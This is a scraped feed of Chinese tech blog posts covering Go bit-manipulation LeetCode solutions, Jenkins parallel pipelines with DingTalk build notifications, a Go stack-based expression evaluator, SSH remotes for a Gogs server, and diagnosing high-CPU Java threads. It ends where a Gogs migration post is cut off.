fmt.Printf(\u0026#34;%d的第8位,置为1后的二进制为:%v\\n\u0026#34;, a, biu.ToBinaryString(b)) b = SetBit(a, 0, 1) fmt.Printf(\u0026#34;%d的第1位,置为1后的二进制为:%v\\n\u0026#34;, a, biu.ToBinaryString(b)) b = SetBit(a, 1, 0) fmt.Printf(\u0026#34;%d的第2位,置为0后的二进制为:%v\\n\u0026#34;, a, biu.ToBinaryString(b)) for i := 0; i \u0026lt; 20; i++ { if IsPowerOfTwo(i) { fmt.Printf(\u0026#34;%d \\tisPowerOfTwo\\n\u0026#34;, i) } } }  output  30二进制为:00011110 a的第2位为:1 30的第6位,置为1后的二进制为:00111110 30的第7位,置为1后的二进制为:01011110 30的第8位,置为1后的二进制为:10011110 30的第1位,置为1后的二进制为:00011111 30的第2位,置为0后的二进制为:00011100 1 isPowerOfTwo 2 isPowerOfTwo 4 isPowerOfTwo 8 isPowerOfTwo 16 isPowerOfTwo 5213. Play with chips 描述 数轴上放置了一些筹码，每个筹码的位置存在数组 chips 当中。\n你可以对 任何筹码 执行下面两种操作之一（不限操作次数，0 次也可以）：\n 将第 i 个筹码向左或者右移动 2 个单位，代价为 0。 将第 i 个筹码向左或者右移动 1 个单位，代价为 1。  最开始的时候，同一位置上也可能放着两个或者更多的筹码。\n返回将所有筹码移动到同一位置（任意位置）上所需要的最小代价。\n示例 1：\n输入：chips = [1,2,3] 输出：1 解释：第二个筹码移动到位置三的代价是 1，第一个筹码移动到位置三的代价是 0，总代价为 1。 示例 2：\n输入：chips = [2,2,2,3,3] 输出：2 解释：第四和第五个筹码移动到位置二的代价都是 1，所以最小总代价为 2。 提示：\n1 \u0026lt;= chips.length \u0026lt;= 100 1 \u0026lt;= chips[i] \u0026lt;= 10^9 解决代码 // 思路: // 偶数/奇数移动无需代价,只需要判断偶数和奇数的个数,取小的个数即可 // 奇数少,可以移动奇数的个数,即花费代价. func MinCostToMoveChips(chips []int) int { odd, even := 0,0 lc := len(chips) for i:=0;i\u0026lt;lc;i++ { if chips[i] \u0026amp; 0x01 == 0 { //偶数 even++ } else { odd++ } } return min(odd, even) } func min(nums ...int) int { m := nums[0] for i := 1; i \u0026lt; len(nums); i++ { if m \u0026gt; nums[i] { m = nums[i] } } return m } 测试 import \u0026quot;testing\u0026quot; func TestMinCostToMoveChips(t *testing.T) { type args struct { chips []int } tests := []struct { name string args args want int }{ {\u0026quot;test01\u0026quot;,args{[]int{1,2,3}},1}, {\u0026quot;test02\u0026quot;,args{[]int{2,2,2,3,3}},2}, } for _, tt := range tests { t.Run(tt.name, func(t *testing.T) { if got := MinCostToMoveChips(tt.args.chips); got != tt.want { t.Errorf(\u0026quot;MinCostToMoveChips() = %v, want %v\u0026quot;, got, tt.want) } }) } } 476. 数字的补数 给定一个正整数，输出它的补数。补数是对该数的二进制表示取反。\n注意:\n给定的整数保证在32位带符号整数的范围内。 你可以假定二进制数不包含前导零位。 示例 1:\n输入: 5 输出: 2 解释: 5的二进制表示为101（没有前导零位），其补数为010。所以你需要输出2。 示例 2:\n输入: 1 输出: 0 解释: 1的二进制表示为1（没有前导零位），其补数为0。所以你需要输出0。 解决  package leetcode // 将num的每一位进行异或,再进行组合,形成新的数. func FindComplement(num int) int { var c, tmp int var i uint for num != 0 { tmp = (num \u0026amp; 0x01) ^ 0x01//取num当前位的异或 c += tmp\u0026lt;\u0026lt;i //将num当前位左移i位后 num \u0026gt;\u0026gt;= 1 i++ } return c } 测试用例 /* Copyright 2019 louis. @Time : 2019/10/7 23:51 @Author : louis @File : 476-numbercomplement @Software: GoLand */ package leetcode import \u0026quot;testing\u0026quot; func TestFindComplement(t *testing.T) { type args struct { num int } tests := []struct { name string args args want int }{ {\u0026quot;test01\u0026quot;,args{5},2}, {\u0026quot;test02\u0026quot;,args{1},0}, {\u0026quot;test03\u0026quot;,args{12},3}, } for _, tt := range tests { t.Run(tt.name, func(t *testing.T) { if got := FindComplement(tt.args.num); got != tt.want { t.Errorf(\u0026quot;FindComplement() = %v, want %v\u0026quot;, got, tt.want) } }) } } 318. 最大单词长度乘积 给定一个字符串数组 words，找到 length(word[i]) * length(word[j]) 的最大值，并且这两个单词不含有公共字母。你可以认为每个单词只包含小写字母。如果不存在这样的两个单词，返回 0。\n示例 1: 输入: [\u0026quot;abcw\u0026quot;,\u0026quot;baz\u0026quot;,\u0026quot;foo\u0026quot;,\u0026quot;bar\u0026quot;,\u0026quot;xtfn\u0026quot;,\u0026quot;abcdef\u0026quot;] 输出: 16 解释: 这两个单词为 \u0026quot;abcw\u0026quot;, \u0026quot;xtfn\u0026quot;。 示例 2: 输入: [\u0026quot;a\u0026quot;,\u0026quot;ab\u0026quot;,\u0026quot;abc\u0026quot;,\u0026quot;d\u0026quot;,\u0026quot;cd\u0026quot;,\u0026quot;bcd\u0026quot;,\u0026quot;abcd\u0026quot;] 输出: 4 解释: 这两个单词为 \u0026quot;ab\u0026quot;, \u0026quot;cd\u0026quot;。 示例 3: 输入: [\u0026quot;a\u0026quot;,\u0026quot;aa\u0026quot;,\u0026quot;aaa\u0026quot;,\u0026quot;aaaa\u0026quot;] 输出: 0 解释: 不存在这样的两个单词。 解决 /* Copyright 2019 louis. @Time : 2019/10/8 0:33 @Author : louis @File : 318-maxproduct @Software: GoLand */ /* 思路: 用二进制的一位表示某一个字母是否出现过，0表示没出现，1表示出现。 \u0026quot;abcd\u0026quot;二进制表示00000000 00000000 00000000 00001111, \u0026quot;bc\u0026quot;二进制表示00000000 00000000 00000000 00000110。 当两个字符串没有相同的字母时，二进制数与的结果为0。 */ package leetcode func String2int(str string) (res int) { for i := 0; i \u0026lt; len(str); i++ { //不能用for-range迭代. res |= 1 \u0026lt;\u0026lt; uint(str[i]-'a') // \u0026quot;abc\u0026quot; ==\u0026gt; 二进制\u0026quot;111\u0026quot; } return res } func MaxProduct(words []string) int { var arr []int = make([]int, len(words)) l := len(words) for i := 0; i \u0026lt; l; i++ { arr[i] = String2int(words[i]) //将[]string数组里面的string,转化为int. } var res int for i := 0; i \u0026lt; l; i++ { for j := i + 1; j \u0026lt; l; j++ { // 遍历数组,如果数组里面\u0026amp;操作为0,即这两个单词不含有公共字母 // 并且res \u0026lt; length(word[i]) * length(word[j])时,更新res. if arr[i]\u0026amp;arr[j] == 0 \u0026amp;\u0026amp; len(words[i])*len(words[j]) \u0026gt; res { res = len(words[i]) * len(words[j]) } } } return res } 测试用例 /* Copyright 2019 louis. @Time : 2019/10/8 0:33 @Author : louis @File : 318-maxproduct @Software: GoLand */ package leetcode import ( \u0026quot;testing\u0026quot; ) func TestMaxProduct(t *testing.T) { type args struct { words []string } tests := []struct { name string args args want int }{ {\u0026quot;test01\u0026quot;, args{[]string{\u0026quot;a\u0026quot;, \u0026quot;ab\u0026quot;, \u0026quot;abc\u0026quot;, \u0026quot;d\u0026quot;, \u0026quot;cd\u0026quot;, \u0026quot;bcd\u0026quot;, \u0026quot;abcd\u0026quot;}}, 4}, {\u0026quot;test02\u0026quot;, args{[]string{\u0026quot;abcw\u0026quot;,\u0026quot;baz\u0026quot;,\u0026quot;foo\u0026quot;,\u0026quot;bar\u0026quot;,\u0026quot;xtfn\u0026quot;,\u0026quot;abcdef\u0026quot;}}, 16}, {\u0026quot;test03\u0026quot;, args{[]string{\u0026quot;a\u0026quot;,\u0026quot;aa\u0026quot;,\u0026quot;aaa\u0026quot;,\u0026quot;aaaa\u0026quot;}}, 0}, } for _, tt := range tests { t.Run(tt.name, func(t *testing.T) { if got := MaxProduct(tt.args.words); got != tt.want { t.Errorf(\u0026quot;MaxProduct() = %v, want %v\u0026quot;, got, tt.want) } }) } } func TestString2int(t *testing.T) { type args struct { str string } tests := []struct { name string args args wantRes int }{ //\u0026quot;abcd\u0026quot;二进制表示00000000 00000000 00000000 00001111, //\u0026quot;bc\u0026quot;二进制表示00000000 00000000 00000000 00000110。 {\u0026quot;test01\u0026quot;,args{\u0026quot;abcd\u0026quot;},0x0f}, {\u0026quot;test02\u0026quot;,args{\u0026quot;bc\u0026quot;},0x06}, } for _, tt := range tests { t.Run(tt.name, func(t *testing.T) { if gotRes := String2int(tt.args.str); gotRes != tt.wantRes { t.Errorf(\u0026quot;String2int() = %v, want %v\u0026quot;, gotRes, tt.wantRes) } }) } } 参考  位运算  ","permalink":"https://www.fenghong.tech/blog/algorithm/2019-10-07-go-bit-byte/","tags":["bit","leetcode"],"title":"Go 位运算详解"},{"categories":["ops","jenkins"],"contents":"[TOC]\n 背景\n公司的jenkins管理了很多的项目,基于主机Ecs管理,比较传统,采用的是脚本打包构建,前端采用nginx进行反向代理,后端采用的是jetty容器构建java项目.后端主机有两台,这样构建打包需要分别在两台主机上打包.构建速度慢.因此,想采用并发构建的方法.pipeline中的parallel刚好满足要求.\n 用到的相关插件  pipeline\nssh-steps-plugin\n 配置pipeline 构建好job,直接配置pipeline.这里提供两种语法\nScripted Pipeline 在脚本式的pipeline中,只在一个或者多个node块执行\n脚本语言的pipeline,语法比较简单,这里采用的方法是ssh远程连接test01和test02主机,然后并发执行脚本,远程连接具体可以参考ssh-steps-plugin\n credentials  jenkins的用户验证,提前设置好,建议使用ssh基于key的认证. 具体设置参考官方,credentials\nnode { stage('Parallel Stage') { parallel 'test02': { def remote = [:] remote.name = \u0026quot;test01\u0026quot; remote.host = \u0026quot;host\u0026quot; remote.port = port remote.allowAnyHosts = true withCredentials([sshUserPrivateKey(credentialsId: 'louis', keyFileVariable: 'identity', passphraseVariable: 'passphrase', usernameVariable: 'username')]) { remote.user = username remote.identityFile = identity remote.passphrase = passphrase stage(\u0026quot;test01-build\u0026quot;) { sshCommand remote: remote, command: 'uname -r' } } }, 'test02': { def remote = [:] remote.name = \u0026quot;test02\u0026quot; remote.host = \u0026quot;host\u0026quot; remote.port = port remote.allowAnyHosts = true withCredentials([sshUserPrivateKey(credentialsId: 'louis', keyFileVariable: 'identity', passphraseVariable: 'passphrase', usernameVariable: 'username')]) { remote.user = username remote.identityFile = identity remote.passphrase = passphrase stage(\u0026quot;test02-build\u0026quot;) { sshCommand remote: remote, command: 'uname -r' } } } } stage('DingDing') { script { def msg = \u0026quot;构建失败，请及时查看原因\u0026quot; def imageUrl = \u0026quot;https://www.iconsdb.com/icons/preview/red/x-mark-3-xxl.png\u0026quot; def dingdingtoken = \u0026quot;https://oapi.dingtalk.com/robot/send?access_token=****************************\u0026quot; if (currentBuild.currentResult==\u0026quot;SUCCESS\u0026quot;){ imageUrl= \u0026quot;http://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/sign-check-icon.png\u0026quot; msg =\u0026quot;发布成功\u0026quot; } sh \u0026quot;sh ${JENKINS_HOME}/dingding.sh ${BUILD_TAG} ${BUILD_URL} ${msg} ${imageUrl} ${dingdingtoken}\u0026quot; } } }  采用dingding脚本通知,钉钉的插件只能使用声明式pipeline中.所以只能自己造轮子了.  curl发送钉钉消息 使用钉钉机器人通知非常简单，通过 curl 命令行工具即可发送通知。\ncurl 'https://oapi.dingtalk.com/robot/send?access_token=xxxxxxxx' \\ -H 'Content-Type: application/json' \\ -d ' {\u0026quot;msgtype\u0026quot;: \u0026quot;text\u0026quot;, \u0026quot;text\u0026quot;: { \u0026quot;content\u0026quot;: \u0026quot;我就是我, 是不一样的烟火\u0026quot; } }' 主要的方式,采用shell脚本,利用curl工具实现.\n$cat dingding.sh #!/bin/sh title=$1 messageUrl=$2 picUrl=$4 text=$3 PHONE=\u0026quot;158215*****\u0026quot; TOKEN=$5 DING=\u0026quot;curl -H \\\u0026quot;Content-Type: application/json\\\u0026quot; -X POST --data '{\\\u0026quot;msgtype\\\u0026quot;: \\\u0026quot;link\\\u0026quot;, \\\u0026quot;link\\\u0026quot;: {\\\u0026quot;messageUrl\\\u0026quot;: \\\u0026quot;${messageUrl}\\\u0026quot;, \\\u0026quot;title\\\u0026quot;: \\\u0026quot;${title}\\\u0026quot;, \\\u0026quot;picUrl\\\u0026quot;: \\\u0026quot;${picUrl}\\\u0026quot;, \\\u0026quot;text\\\u0026quot;: \\\u0026quot;${text}\\\u0026quot;,}, \\\u0026quot;at\\\u0026quot;: {\\\u0026quot;atMobiles\\\u0026quot;: [${PHONE}], \\\u0026quot;isAtAll\\\u0026quot;: false}}' ${TOKEN}\u0026quot; eval $DING  验证  jenkins的环境变量比较多,建议参考这篇文章jenkins可用环境变量列表及使用\n获取$1,$2,$3,$4,$5. $1 为title,这里我设置为build_tag $2 为messageUrl, 这里我这种为Build_Url $3 为text(消息内容), 这里根据构建成功还是失败,进行判断 $4 为picUrl(对勾还是xx), $5 DingDingToken. 查看pipeline中的日志,有执行sh的记录.模板记录如下: sh /var/jenkins_home/dingding.sh jenkins-test-qx-44 http://106.75.107.122:8088/job/test-qx/44/ 发布成功 http://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/sign-check-icon.png https://oapi.dingtalk.com/robot/send?access_token=**** Declarative Pipeline 声明式的pipeline语法,pipeline贯穿了整个工作流.\npipeline { agent any stages { stage('Parallel Stage') { failFast true parallel { stage('并行一') { steps { script { try { echo \u0026quot;并行一\u0026quot; sh \u0026quot;ssh -f -n -p port root@host uname -r\u0026quot; }catch(err){ echo \u0026quot;${err}\u0026quot; sh 'exit 1' } } } } stage('并行二') { steps { script { try { echo \u0026quot;并行二\u0026quot; sh \u0026quot;ssh -f -n -p port root@host uname -r\u0026quot; }catch(err){ echo \u0026quot;${err}\u0026quot; sh 'exit 1' } } } } } } } post { always { script { def msg = \u0026quot;构建失败，请及时查看原因\u0026quot; def imageUrl = \u0026quot;https://www.iconsdb.com/icons/preview/red/x-mark-3-xxl.png\u0026quot; if (currentBuild.currentResult==\u0026quot;SUCCESS\u0026quot;){ imageUrl= \u0026quot;http://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/sign-check-icon.png\u0026quot; msg =\u0026quot;发布成功，干得不错！\u0026quot; } dingTalk accessToken:\u0026quot;***********\u0026quot;,message:\u0026quot;${msg}\u0026quot;,imageUrl:\u0026quot;${imageUrl}\u0026quot;,jenkinsUrl:\u0026quot;${BUILD_URL}\u0026quot;,notifyPeople: '' } } } } 更多语法参考官网\n参考  dingding CURL 钉钉机器人 JSON 传参  ","permalink":"https://www.fenghong.tech/blog/ops/jenkins-pipeline-parallel/","tags":["ops","jenkins","pipeline"],"title":"pipeline实现并发构建"},{"categories":["algorithm","golang"],"contents":"[TOC]\n 运算表达式参考学习韩老师的golang教程.\n 设计思路 采用golang实现常用的表达式求值,不包含括号,这边暂时没有实现.\n数据结构使用Stack如下,使用两个栈分别来存储操作数和运算符.\nconst MaxTop = 30 type Stack struct { Top int arr [MaxTop]int } 思考需要解决哪些问题才能解决表达式求值呢?\n 如何读取表达式的运算符和操作数. 操作符和运算数如何进行比较 如何使得操作数每次运算都能安装优先来进行运算  为了解决上面的三个问题,思考如下.\n// 1. 设计一个算法,读取表达式中的每个字符.对表达式进行切分,我们知道string类型底层实现为slice切片. 每取一个字符,对index++,循环读取即可完成对每个操作运算符的提取. ch := exp[index : index+1] // \u0026quot;3\u0026quot; 单个字符串, \u0026quot;+\u0026quot; ==\u0026gt; 43 // 2. 将单个字符串转为ASCII对应的十进制数. temp := int([]byte(ch)[0]) // 字符串转为byte, /* 3. 对取出来的每个ASCII的十进制数进行判断,如果为操作数,则直接入操作数栈 如果为运算符,则需要进行判断: a. 如果符号栈为空,则符号栈直接入栈. b. 如果符号栈不为空,则进行比对,如果 A. 当前符号栈顶的运算符优先级 \u0026gt;= 要入栈的运算符优先级, 从符号栈弹出一个运算符,从操作数栈弹出两个数,进行运算,运算结果存入操作数栈. (这里需要循环比对,如果不循环比对,+ * - * -,最后没有办法求解) B. 当前符号栈顶的运算符优先级 \u0026lt; 要入栈的运算符优先级,则直接入符号栈. 4. 执行这些后,当前操作数栈和符号栈的栈底到栈顶的优先级,始终是从低到高,每次弹出2个操作数,一个运算符,进行计算后,将结果压入操作数栈,循环操作,最后一个存入的操作数即为结果. */ 这里有个漏洞,如果是多位数操作怎么办,这样的思路就错了,每次读入一位数,最后的结果肯定不是我们所想. 进行运算和判断的方法 // 1.判断Stack为空方法  func (s *Stack) IsEmpty() bool { return s.Top == -1 } // 2. 判断Stack已满方法 func (s *Stack) IsFull() bool { return s.Top == MaxTop-1 } // 3. 判断Stack的大小方法 func (s *Stack) Size() int { return len(arr[:s.Top]) } // 4. 入栈 func (s *Stack) Push(val int) bool { if s.IsFull() { return false } s.Top++ s.arr[s.Top]= val return true } // 5. 出栈 func (s *Stack) Pop()(val int, bool) { if s.IsEmpty() { returnn -1, false } val = s.arr[s.Top] s.Top-- return val, true } // 6. 判断是否为运算符 func (s *Stack) IsOpr(val int) bool { if val == 42 || val == 43 || val == 45 || val == 47 || val == 94 { return true }\treturn false } // 7.0 计算幂(整形) func power(a, n int) int { res := 1 if n != 0 { res *= a n-- } retuen res } // 7. 计算操作数与运算符 func (s *Stack) Cal(a, b, opr int) (res int) { switch opr { case 42: res = b * a case 43: res = b + a case 45: res = b - a case 47: res = b / a case 94: res = power(b, a) // b^a \t} return res } // 8. 定义运算符的优先级 func (s *Stack) Nice(opr int) (res int) { switch { case opr == 43 || opr == 45: // * / \tres = 1 case opr == 94: // ^ \tres = 2 case opr == 42 || opr == 47: // + - \tfallthough\tdefault: res = 0 } return res } Exp求值 如果给出的exp符合表达式,那么结果一定存在.\nfunc Exp(exp string) (res int) { numStack := \u0026amp;Stack{ Top: -1, } oprStack := \u0026amp;Stack{ Top: -1, } index, a, b, opr, res := 0, 0, 0, 0, 0 keepNum := \u0026#34;\u0026#34; for { ch := exp[index : index+1] // \u0026#34;3\u0026#34; 单个字符串, \u0026#34;+\u0026#34; ==\u0026gt; 43 \tfmt.Println(ch) temp := int([]byte(ch)[0]) //字符串转为byte, 字符转的ASCII码 \tif oprStack.IsOpr(temp) { // 如果是数字,则进入数字处理逻辑. \t// 如果operStack是空栈,直接入栈; \t// 并将数栈也pop出两个数,进行运算, \t// 将运算的结果push到数栈,符号再入符号栈 \tif oprStack.IsEmpty() { oprStack.Push(temp) } else { //不是空栈的话,如果栈顶的运算符优先级, \t//大于当前准备入栈的运算符优先级,先pop出栈 \t//例如 栈顶运算符为 * ,准备 入栈的运算符为 + , \t//则先出栈. 并从操作栈取出两个操作数进行运算, \t//再把结果压入操作栈==\u0026gt; \t//继续进行比较, 如果栈顶的运算符优先级大于 \t//当前准备入栈的运算符优先级,先pop出栈.  //直到栈为空.或者栈的优先级从低到高排列. \tfor oprStack.Nice(oprStack.arr[oprStack.Top]) \u0026gt;= oprStack.Nice(temp) { a, _ = numStack.Pop() b, _ = numStack.Pop() opr, _ = oprStack.Pop() res = oprStack.Cal(a, b, opr) //运算结果重新入数栈 \tnumStack.Push(res) // 弹出opr运算符之后,进行判空处理,为空就直接跳出循环  // 直接将待入栈的运算符压入符号栈. \tif oprStack.IsEmpty() { break } } oprStack.Push(temp) } } else { //数字,如何处理多位数的逻辑. \t//处理多位数 keepNum string,拼接. \tkeepNum += ch if index == len(exp)-1 { // 如果是最后的一个数,则直接将str \u0026#39;3\u0026#39; ==\u0026gt; 转换为int 3 \tval, _ := strconv.ParseInt(keepNum, 10, 64) numStack.Push(int(val)) // 3 ==\u0026gt; 51(ASCII) \t} else { if oprStack.IsOpr(int([]byte(exp[index+1 : index+2])[0])) { // 如果下一个字符是运算符,则直将keepNum压入操作数栈.  // 否则就一直进行keepNum += ch 拼接操作. \tval, _ := strconv.ParseInt(keepNum, 10, 64) numStack.Push(int(val)) // 3 ==\u0026gt; 51(ASCII)  // 操作数入栈后,keep置空. \tkeepNum = \u0026#34;\u0026#34; } } } // 判断index是否已经扫完 \tif index+1 == len(exp) { break } index++ } // 优先级高的已经计算完,或者优先级从低到高在符号栈排列.  for { //符号栈为空就跳出循环,这时候操作数栈最后的一个数肯定就是exp的结果. \tif oprStack.IsEmpty() { break } a, _ = numStack.Pop() b, _ = numStack.Pop() opr, _ = oprStack.Pop() res = oprStack.Cal(a, b, opr) //运算结果重新入数栈 \tnumStack.Push(res) } res, _ = numStack.Pop() return res } 验证 给出一个表达式,来进行验证.\nfunc main() { exp := \u0026#34;30+30*6-4^2-6\u0026#34; res := Exp(exp) fmt.Printf(\u0026#34;exp %s = %v\u0026#34;, exp, res) } /*output exp 30+30*6-4^2-6 = 188 */  整体的代码  package main import ( \u0026quot;fmt\u0026quot; \u0026quot;strconv\u0026quot; ) const MaxTop = 30 type Stack struct { Top int arr [MaxTop]int } func (s *Stack) IsEmpty() bool { return s.Top == -1 } func (s *Stack) IsFull() bool { return s.Top == MaxTop-1 } func (s *Stack) Size() int { return len(s.arr[:s.Top]) } func (s *Stack) Push(val int) (b bool) { if s.IsFull() { return false } s.Top++ s.arr[s.Top] = val fmt.Printf(\u0026quot;stack push %#v\\n\u0026quot;, val) return true } func (s *Stack) Pop() (val int, b bool) { if s.IsEmpty() { return 0,false } val = s.arr[s.Top] s.Top-- fmt.Printf(\u0026quot;stach pop %#v\\n\u0026quot;, val) return val, true } func (s *Stack) List() { if s.IsEmpty() { return } //for k,v :=range s.arr { //\tdefer fmt.Printf(\u0026quot;arr[%d] = %d\\n\u0026quot;,k,v) //} fmt.Println(\u0026quot;Stack --\u0026gt;\u0026quot;) for i := s.Top; i \u0026gt;= 0; i-- { fmt.Printf(\u0026quot;arr[%d] = %d\\n\u0026quot;, i, s.arr[i]) } } // 判断是否为运算符[+,-,*,/,^] func (s *Stack) IsOpr(val int) bool { /* ASCII '42 * 43 + 45 - 47 /' */ if val == 42 || val == 43 || val == 45 || val == 47 || val == 94 { return true } else { return false } } func Power(a, n int) int { res := 1 for n != 0 { res *= a n-- } return res } func (s *Stack) Cal(a, b, opr int) int { res := 0 switch opr { case 42: res = b * a case 43: res = b + a case 45: res = b - a case 47: res = b / a case 94: res = Power(b, a) // b^a default: fmt.Println(\u0026quot;opr is err\u0026quot;) } return res } // 编写方法,返回运算符的优先级[自定义] func (s *Stack) Nice(opr int) int { /* * / Nice返回1 + - Nice返回0\t^ Nice返回2*/ res := 0 if opr == 42 || opr == 47 { return 1 } else if opr == 43 || opr == 45 { return 0 } else if opr == 94 { // 94\t^ return 2 } return res } func Exp(exp string) (res int) { numStack := \u0026amp;Stack{ Top: -1, } oprStack := \u0026amp;Stack{ Top: -1, } index, a, b, opr, res := 0, 0, 0, 0, 0 keepNum := \u0026quot;\u0026quot; for { ch := exp[index : index+1] // \u0026quot;3\u0026quot; 单个字符串, \u0026quot;+\u0026quot; ==\u0026gt; 43 temp := int([]byte(ch)[0]) //字符串转为byte, 字符转的ASCII码 if oprStack.IsOpr(temp) { // 如果是数字,则进入数字处理逻辑. // 如果operStack是空栈,直接入栈; // 并将数栈也pop出两个数,进行运算, // 将运算的结果push到数栈,符号再入符号栈 if oprStack.IsEmpty() { oprStack.Push(temp) } else { //不是空栈的话,如果栈顶的运算符优先级, //大于当前准备入栈的运算符优先级,先pop出栈 //例如 栈顶运算符为 * ,准备 入栈的运算符为 + , //则先出栈. 并从操作栈取出两个操作数进行运算, //再把结果压入操作栈==\u0026gt; //继续进行比较, 如果栈顶的运算符优先级大于 //当前准备入栈的运算符优先级,先pop出栈. //直到栈为空.或者栈的优先级从低到高排列. for oprStack.Nice(oprStack.arr[oprStack.Top]) \u0026gt;= oprStack.Nice(temp) { a, _ = numStack.Pop() b, _ = numStack.Pop() opr, _ = oprStack.Pop() res = oprStack.Cal(a, b, opr) //运算结果重新入数栈 numStack.Push(res) // 弹出opr运算符之后,进行判空处理,为空就直接跳出循环 // 直接将待入栈的运算符压入符号栈. if oprStack.IsEmpty() { break } } oprStack.Push(temp) } } else { //数字,如何处理多位数的逻辑. //处理多位数 keepNum string,拼接. keepNum += ch if index == len(exp)-1 { // 如果是最后的一个数,则直接将str '3' ==\u0026gt; 转换为int 3 val, _ := strconv.ParseInt(keepNum, 10, 64) numStack.Push(int(val)) // 3 ==\u0026gt; 51(ASCII) } else { if oprStack.IsOpr(int([]byte(exp[index+1 : index+2])[0])) { // 如果下一个字符是运算符,则直将keepNum压入操作数栈. // 否则就一直进行keepNum += ch 拼接操作. val, _ := strconv.ParseInt(keepNum, 10, 64) numStack.Push(int(val)) // 3 ==\u0026gt; 51(ASCII) // 操作数入栈后,keep置空. keepNum = \u0026quot;\u0026quot; } } } // 判断index是否已经扫完 if index+1 == len(exp) { break } // 每次扫完都必须index++,扫描下一个exp index++ } // 优先级高的已经计算完,或者优先级从低到高在符号栈排列. for { //符号栈为空就跳出循环,这时候操作数栈最后的一个数肯定就是exp的结果. if oprStack.IsEmpty() { break } a, _ = numStack.Pop() b, _ = numStack.Pop() opr, _ = oprStack.Pop() res = oprStack.Cal(a, b, opr) //运算结果重新入数栈 numStack.Push(res) } res, _ = numStack.Pop() return res } func main() { exp := \u0026quot;30+30*6-4^2-6\u0026quot; res := Exp(exp) fmt.Printf(\u0026quot;exp %s = %v\u0026quot;, exp, res) } //stack push 30 //stack push 43 //stack push 30 //stack push 42 //stack push 6 //stack push 180 //stack push 210 //stack push 45 //stack push 4 //stack push 94 //stack push 2 //stack push 16 //stack push 194 //stack push 45 //stack push 6 //stack push 188 //exp 30+30*6-4^2-6 = 188 参考  韩顺平golang教程. 数据结构与算法  ","permalink":"https://www.fenghong.tech/blog/algorithm/go-exp-math/","tags":["stack","algorithm","exp"],"title":"Go 运算表达式求值"},{"categories":["ops"],"contents":"[TOC]\n背景  使用git clone https://url.com/project/web.git速度比较慢.\n直接使用git clone git@url.com:project/web.git速度相对较快.而且比较简洁.\n 使用方法 服务端配置  生成自己的ssh秘钥,如果你已经有了自己的秘钥,可以跳过这一步  $ ssh-keygen ## 一路enter即可生成, ## 生成的秘钥在 ~/.ssh/id_rsa,保存好 ## 公钥在 ~/.ssh/id_rsa.pub  将自己的公钥添加到git服务器端, 这里使用gogs作为轻量的git服务器端.其他的git服务器端类似. 点击个人账户设置 ==\u0026gt; SSH 秘钥 ==\u0026gt; 增加密钥,将生成的id_rsa.pub信息填入保存即可.  SourceTree端的配置  检查是否能git直连服务器,出现以下信息说明能使用git进行clone\\push\\pull等常规操作了.  $ ssh -T git@url.com Hi there, You\u0026#39;ve successfully authenticated, but Gogs does not provide shell access. If this is unexpected, please log in with password and setup Gogs under another user.  配置SourceTree  打开sourceTree软件,点击主菜单的工具 ==\u0026gt; 选项 ==\u0026gt; SSH 密钥地址,SSH客户端选择OpenSSH.\n 配置仓库  公司的项目一般很多,比较分散,要一个一个替换的确比较麻烦,也比较费脑.这里写了一个命令来帮助大家一键更改.windows上面的git-bash是支持的,可以放心使用.\n## 1. 查找匹配需要替换的url路径,一般源码都是放在一个总的文件夹,然后其他的子项目,或者子子项目都在子文件夹. $ find ./ -maxdepth 4 -name 'config' |xargs grep \u0026quot;repodomain\u0026quot; ./chizhan/baodun/.git/config: url =https://repodomain/chizhan/baodun.git ./chizhan/cz-springbootx/.git/config: url =https://repodomain/chizhan/springbootx.git 参数说明 : -maxdepth 4 只在前4层目录进行查找. 比如 ./chizhan/baodun/.git/ 这个为三层,则config必定在第四层.即我们需要更改的文件配置. ## 2. 真正的替换操作,谨慎操作,谨慎操作,谨慎操作,重要的说三遍,先查找一下确定是你要修改的,再执行此命令!! $ find ./ -maxdepth 4 -name 'config' |xargs sed -i \u0026quot;s\u0026amp;https://gogs.qianxiangbank.com/\u0026amp; git@gogs.qianxiangbank.com:\u0026amp;g\u0026quot;  享受非一般的速度吧~  总结 https中间的转换多了nginx的反向代理的一层网络,多了一层开销,会有一定的延迟,使用git相当于直连了.所以速度提升了.\n","permalink":"https://www.fenghong.tech/blog/intro/git-in-gogs/","tags":["git","gogs","sourceTree"],"title":"Git in Gogs with SourceTree"},{"categories":["ops"],"contents":"[TOC]\n 近期java应用，CPU使用率一直很高，经常达到100%，通过以下步骤完美解决，分享一下。\n 方法一： 转载\n## 1.获取Java进程的PID。 $ ps axu |grep java $ top ## 2. 导出CPU占用高进程的线程栈。 jstack pid \u0026gt;\u0026gt; java.txt ## 3. 查看对应进程的哪个线程占用CPU过高。 $ top -H -p PID ## 4. 将线程的PID转换为16进制,大写转换为小写。 $ pidhex=`echo \u0026quot;obase=16; PID\u0026quot; | bc | tr \u0026quot;[:upper:]\u0026quot; \u0026quot;[:lower:]\u0026quot;` ## 5. 在第二步导出的java.txt中查找转换成为16进制的线程PID。找到对应的线程栈 $ grep $pidhex -A 30 java.txt ## 分析负载高的线程栈都是什么业务操作。优化程序并处理问题。 方法二： ## 1.使用top 定位到占用CPU高的进程PID $ top $ ps aux | grep PID命令 ## 2.获取线程信息，并找到占用CPU高的线程 $ ps -mp pid -o THREAD,tid,time | sort -rn ##3.将需要的线程ID转换为16进制格式 $ printf \u0026quot;%x\\n\u0026quot; tid ## 4.打印线程的堆栈信息 $ jstack pid |grep tid -A 30 ","permalink":"https://www.fenghong.tech/blog/java/java-cpu-overload/","tags":["java"],"title":"java overload"},{"categories":["ops"],"contents":"[TOC]\n 公司服务器缩减，运维平台迁移，以前的项目得一个一个迁移，比如gogs仓库迁移，jenkins迁移，sonarqube迁移，gogs迁移过程算是幸运，从阿里云迁移至ucloud，包括打包仓库，错误处理，总共花费2小时。在此记录一下gogs迁移记录，后续的迁移也会一一记录的。\n# 表示注释， $ 表示shell \n 服务器迁移准备 检查依赖，主要为gogs版本和数据库版本。\ngogs 版本为最新版 mariadb 10.2.6 大概是2017年装的.数据库不敢动，依旧保持这个数据库。 迁移思路  做好数据备份，包括gogs-repositories,conf,backup.sql等重要备份。 scp或者stfp将打包的文件转移至新服务器。 由于老版本是基于宿主机部署的，各个文件比较分散，这次转移采用docker-compose部署。快捷方便，一旦错误，可以快速定位，可以形成一个包。 启动程序快速定位问题，学会查看日志，学会google大法。  部署  备份，转移操作。  ## gogs的配置和repo文件 $ 